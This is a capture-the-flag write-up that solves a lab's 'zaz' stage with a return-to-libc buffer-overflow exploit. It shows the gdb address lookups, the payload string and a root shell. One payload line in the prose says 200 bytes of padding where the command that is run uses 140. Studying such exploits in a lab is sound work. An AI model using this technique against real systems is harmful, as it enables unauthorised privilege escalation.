# Bonus: Alternative zaz solution - Return-to-libc

We begin in writeup1 in **zaz** section right after detemiming the offset.
As a reminder offset is 140.

Our plan now is to use *return-to-libc attack* instead of shellcode. We will replace a subriutine return address on a call stack by address of a subroutine already in process executable memory. "libc" containings such functions as "system", for example, is very convenient.

Let's first check whether there is any protection from such exploit. We are talking about ASLR (Address space layout randomization):

```
zaz@BornToSecHackMe:~$ cat /proc/sys/kernel/randomize_va_space
0
```

No ASLR - time to find addresses for `system`, `exit` and `/bin/sh`

```
(gdb) b main
Breakpoint 1 at 0x80483f7
(gdb) r
Starting program: /home/zaz/exploit_me

Breakpoint 1, 0x080483f7 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) info proc map
process 2196
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
        0xb7e2b000 0xb7e2c000     0x1000        0x0
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0
        0xb7fdb000 0xb7fdd000     0x2000        0x0
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
```

So we have our addresses:
> - `system`  0xb7e6b060
> - `exit`    0xb7e5ebe0
> - `/bin/sh` 0xb7f8cc58

Now let's build our input: 
"offset + system + exit + /bin/sh" = `"\x90" * 200 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"`

 ```
zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "\x90" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"'`
��������������������������������������������������������������������������������������������������������������������������������������������`�����X���
# whoami
root
 ```

**We are root**